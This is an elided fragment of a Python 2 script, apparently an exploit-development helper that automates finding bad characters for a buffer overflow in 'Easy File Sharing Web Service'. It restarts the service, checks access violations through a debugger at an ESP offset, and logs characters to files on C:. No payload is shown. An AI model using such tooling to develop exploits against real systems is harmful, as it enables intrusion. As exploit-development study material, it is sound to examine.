...
process_name = "fswsService.exe"  ##CHANGE THIS
process_is_running = False
good_chars = []
bad_chars = []
lock = threading.Lock()
start_crash = False
start_cmd = 'net start "Easy File Sharing Web Service"' ##CHANGE THIS
#start_cmd = 'C:\\start.bat' ##CHANGE THIS
#start_cmd = "net start vulnserver.exe"
stop_cmd = 'net stop "Easy File Sharing Web Service"'
...
def check_accessv(dbg):
    ...
    ##CHANGE THIS
    esp_offset = 0x10B0 # this is in hex
...
def crash_me():
    ...
    while True:
        ...
        if start_crash:
            ...
            print "[*] Start crash flag not set " + "for " + str(timer) + " seconds"
            # timer =0
            time.sleep(1)
            if timer > 10:
                print "[-] Anomaly detected - possible Bad characters!!! - Waiting to restart ..."
                print "[+] I found a bad character: " + str(current_char)
                bad_chars.append(current_char)
                with open("c:\\bad_character_list.txt",'a+') as f:
                    f.write("\\x" + str(current_char))
                with open("c:\\all_character_list.txt", 'a+') as f:
                    f.write("\\x" + str(current_char) + " => " + "no_crash" +"\n" )
